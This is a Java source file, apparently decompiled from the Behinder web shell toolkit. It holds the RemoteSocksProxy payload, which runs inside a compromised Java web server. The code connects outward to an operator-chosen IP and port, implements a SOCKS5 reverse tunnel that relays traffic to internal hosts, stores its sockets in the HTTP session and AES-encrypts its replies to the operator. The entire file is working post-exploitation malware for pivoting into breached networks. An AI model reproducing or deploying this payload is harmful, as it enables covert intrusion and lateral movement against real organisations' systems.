package net.rebeyond.behinder.payload.java;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.channels.SocketChannel;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class RemoteSocksProxy implements Runnable {
   public static String action;
   public static String remoteIP;
   public static String remotePort;
   private Object Request;
   private Object Response;
   private Object Session;
   private int listenPort = 5555;
   private String threadType;
   private Long threadID;
   private Map paramMap;

   public RemoteSocksProxy(String threadType, Map paramMap) {
      this.threadType = threadType;
      this.paramMap = paramMap;
   }

   public RemoteSocksProxy(String threadType, Map paramMap, Long threadID) {
      this.threadType = threadType;
      this.paramMap = paramMap;
      this.threadID = threadID;
   }

   public RemoteSocksProxy() {
   }

   public boolean equals(Object obj) {
      try {
         this.fillContext(obj);
      } catch (Exception var29) {
         return true;
      }

      HashMap result = new HashMap();
      boolean var21 = false;

      Object so;
      Method write;
      label167: {
         try {
            var21 = true;
            Map paramMap = new HashMap();
            paramMap.put("remoteIP", remoteIP);
            paramMap.put("remotePort", remotePort);
            paramMap.put("request", this.Request);
            paramMap.put("response", this.Response);
            paramMap.put("session", this.Session);
            if (action.equals("create")) {
               try {
                  (new Thread(new RemoteSocksProxy("link", paramMap))).start();
                  result.put("status", "success");
                  result.put("msg", "success");
                  var21 = false;
               } catch (Exception var28) {
                  result.put("status", "fail");
                  result.put("msg", var28.getMessage());
                  var21 = false;
               }
            } else if (!action.equals("stop")) {
               var21 = false;
            } else {
               Enumeration keys = this.sessionGetAttributeNames(this.Session);

               while(keys.hasMoreElements()) {
                  String key = keys.nextElement().toString();
                  if (key.startsWith("socks_")) {
                     Object socket = this.sessionGetAttribute(this.Session, key);
                     this.sessionRemoveAttribute(this.Session, key);
                     if (socket.getClass().getName().indexOf("SocketChannel") >= 0) {
                        try {
                           ((SocketChannel)socket).close();
                        } catch (IOException var27) {
                        }
                     } else if (socket.getClass().getName().indexOf("ServerSocket") >= 0) {
                        try {
                           ((ServerSocket)socket).close();
                        } catch (IOException var26) {
                        }
                     } else {
                        try {
                           ((Socket)socket).close();
                        } catch (IOException var25) {
                        }
                     }
                  }
               }

               result.put("status", "success");
               result.put("msg", "success");
               var21 = false;
            }
            break label167;
         } catch (Exception var30) {
            result.put("status", "fail");
            result.put("msg", var30.getMessage());
            var21 = false;
         } finally {
            if (var21) {
               try {
                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
               } catch (Exception var22) {
                  var22.printStackTrace();
               }

            }
         }

         try {
            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
            write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.getClass().getMethod("flush").invoke(so);
            so.getClass().getMethod("close").invoke(so);
         } catch (Exception var23) {
            var23.printStackTrace();
         }

         return true;
      }

      try {
         so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
         write = so.getClass().getMethod("write", byte[].class);
         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.getClass().getMethod("flush").invoke(so);
         so.getClass().getMethod("close").invoke(so);
      } catch (Exception var24) {
         var24.printStackTrace();
      }

      return true;
   }

   public void run() {
      if (this.threadType.equals("link")) {
         Map paramMap = new HashMap();

         try {
            long threadID = Thread.currentThread().getId();
            Object session = this.paramMap.get("session");
            paramMap.put("session", session);
            Socket outerSocket = new Socket(remoteIP, Integer.parseInt(remotePort));
            String outerSocketHash = "socks_outer_" + outerSocket.getLocalPort() + "_" + remoteIP + "_" + remotePort;
            this.sessionSetAttribute(session, outerSocketHash, outerSocket);
            paramMap.put("outerSocketHash", outerSocketHash);
            (new Thread(new RemoteSocksProxy("session", paramMap))).start();
         } catch (IOException var10) {
            var10.printStackTrace();
         }
      } else {
         Object session;
         Socket outerSocket;
         if (this.threadType.equals("session")) {
            session = this.paramMap.get("session");
            outerSocket = (Socket)this.sessionGetAttribute(session, this.paramMap.get("outerSocketHash").toString());

            try {
               if (this.handleSocks(outerSocket)) {
                  Thread writer = new Thread(new RemoteSocksProxy("sessionWrite", this.paramMap));
                  writer.start();
                  Thread reader = new Thread(new RemoteSocksProxy("sessionRead", this.paramMap));
                  reader.start();
               }
            } catch (Exception var9) {
               var9.printStackTrace();
            }
         } else {
            Socket targetSocket;
            byte[] buf;
            int bytesRead;
            if (this.threadType.equals("sessionRead")) {
               session = this.paramMap.get("session");
               outerSocket = (Socket)this.sessionGetAttribute(session, this.paramMap.get("outerSocketHash").toString());
               targetSocket = (Socket)this.sessionGetAttribute(session, this.paramMap.get("targetSocketHash").toString());
               if (outerSocket != null) {
                  try {
                     buf = new byte[512];

                     for(bytesRead = targetSocket.getInputStream().read(buf); bytesRead > 0; bytesRead = targetSocket.getInputStream().read(buf)) {
                        outerSocket.getOutputStream().write(buf, 0, bytesRead);
                        outerSocket.getOutputStream().flush();
                     }
                  } catch (Exception var11) {
                     var11.printStackTrace();
                  }

                  try {
                     outerSocket.close();
                     targetSocket.close();
                  } catch (Exception var8) {
                     var8.printStackTrace();
                  }
               }
            } else if (this.threadType.equals("sessionWrite")) {
               session = this.paramMap.get("session");
               outerSocket = (Socket)this.sessionGetAttribute(session, this.paramMap.get("outerSocketHash").toString());
               targetSocket = (Socket)this.sessionGetAttribute(session, this.paramMap.get("targetSocketHash").toString());
               if (outerSocket != null) {
                  try {
                     buf = new byte[512];

                     for(bytesRead = outerSocket.getInputStream().read(buf); bytesRead > 0; bytesRead = outerSocket.getInputStream().read(buf)) {
                        targetSocket.getOutputStream().write(buf, 0, bytesRead);
                        targetSocket.getOutputStream().flush();
                     }
                  } catch (Exception var12) {
                     var12.printStackTrace();
                  }

                  try {
                     outerSocket.close();
                     targetSocket.close();
                  } catch (Exception var7) {
                     var7.printStackTrace();
                  }
               }
            }
         }
      }

   }

   private boolean handleSocks(Socket socket) throws Exception {
      int ver = socket.getInputStream().read();
      (new Thread(new RemoteSocksProxy("link", this.paramMap))).start();
      if (ver == 5) {
         return this.parseSocks5(socket);
      } else {
         return ver == 4 ? this.parseSocks4(socket) : false;
      }
   }

   private boolean parseSocks5(Socket socket) throws Exception {
      DataInputStream ins = new DataInputStream(socket.getInputStream());
      DataOutputStream os = new DataOutputStream(socket.getOutputStream());
      int nmethods = ins.read();

      for(int i = 0; i < nmethods; ++i) {
         int var10 = ins.read();
      }

      os.write(new byte[]{5, 0});
      int version = ins.read();
      int cmd;
      int rsv;
      int atyp;
      if (version == 2) {
         version = ins.read();
         cmd = ins.read();
         rsv = ins.read();
         atyp = ins.read();
      } else {
         cmd = ins.read();
         rsv = ins.read();
         atyp = ins.read();
      }

      byte[] targetPort = new byte[2];
      String host = "";
      byte[] target;
      if (atyp == 1) {
         target = new byte[4];
         ins.readFully(target);
         ins.readFully(targetPort);
         String[] tempArray = new String[4];

         int temp;
         for(int i = 0; i < target.length; ++i) {
            temp = target[i] & 255;
            tempArray[i] = temp + "";
         }

         String[] var23 = tempArray;
         temp = tempArray.length;

         for(int var16 = 0; var16 < temp; ++var16) {
            String tempp = var23[var16];
            host = host + tempp + ".";
         }

         host = host.substring(0, host.length() - 1);
      } else if (atyp == 3) {
         int targetLen = ins.read();
         target = new byte[targetLen];
         ins.readFully(target);
         ins.readFully(targetPort);
         host = new String(target);
      } else if (atyp == 4) {
         target = new byte[16];
         ins.readFully(target);
         ins.readFully(targetPort);
         host = new String(target);
      }

      int port = (targetPort[0] & 255) * 256 + (targetPort[1] & 255);
      if (cmd != 2 && cmd != 3) {
         if (cmd == 1) {
            host = InetAddress.getByName(host).getHostAddress();

            try {
               Socket targetSocket = new Socket(host, port);
               String targetSocketHash = "socks_target_" + targetSocket.getLocalPort() + "_" + host + "_" + port;
               this.paramMap.put("targetSocketHash", targetSocketHash);
               this.sessionSetAttribute(this.paramMap.get("session"), targetSocketHash, targetSocket);
               os.write(mergeByteArray(new byte[]{5, 0, 0, 1}, InetAddress.getByName(host).getAddress(), targetPort));
               return true;
            } catch (Exception var18) {
               os.write(mergeByteArray(new byte[]{5, 5, 0, 1}, InetAddress.getByName(host).getAddress(), targetPort));
               throw new Exception(String.format("[%s:%d] Remote failed", host, port));
            }
         } else {
            throw new Exception("Socks5 - Unknown CMD");
         }
      } else {
         throw new Exception("not implemented");
      }
   }

   private boolean parseSocks4(Socket socket) {
      return false;
   }

   public static byte[] mergeByteArray(byte[]... byteArray) {
      int totalLength = 0;

      for(int i = 0; i < byteArray.length; ++i) {
         if (byteArray[i] != null) {
            totalLength += byteArray[i].length;
         }
      }

      byte[] result = new byte[totalLength];
      int cur = 0;

      for(int i = 0; i < byteArray.length; ++i) {
         if (byteArray[i] != null) {
            System.arraycopy(byteArray[i], 0, result, cur, byteArray[i].length);
            cur += byteArray[i].length;
         }
      }

      return result;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   private static String base64encode(String content) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");
      Class Base64;
      Object Encoder;
      if (version.compareTo("1.9") >= 0) {
         Base64 = Class.forName("java.util.Base64");
         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content.getBytes("UTF-8"));
      } else {
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, content.getBytes("UTF-8"));
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            value = base64encode(value);
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private Object sessionGetAttribute(Object session, String key) {
      Object result = null;

      try {
         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
      } catch (Exception var5) {
      }

      return result;
   }

   private void sessionSetAttribute(Object session, String key, Object value) {
      try {
         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
      } catch (Exception var5) {
      }

   }

   private Enumeration sessionGetAttributeNames(Object session) {
      Enumeration result = null;

      try {
         result = (Enumeration)session.getClass().getMethod("getAttributeNames").invoke(session);
      } catch (Exception var4) {
      }

      return result;
   }

   private void sessionRemoveAttribute(Object session, String key) {
      try {
         session.getClass().getMethod("removeAttribute").invoke(session, key);
      } catch (Exception var4) {
      }

   }

   private byte[] getMagic() throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
      Random random = new Random();
      byte[] buf = new byte[magicNum];

      for(int i = 0; i < buf.length; ++i) {
         buf[i] = (byte)random.nextInt(256);
      }

      return buf;
   }
}
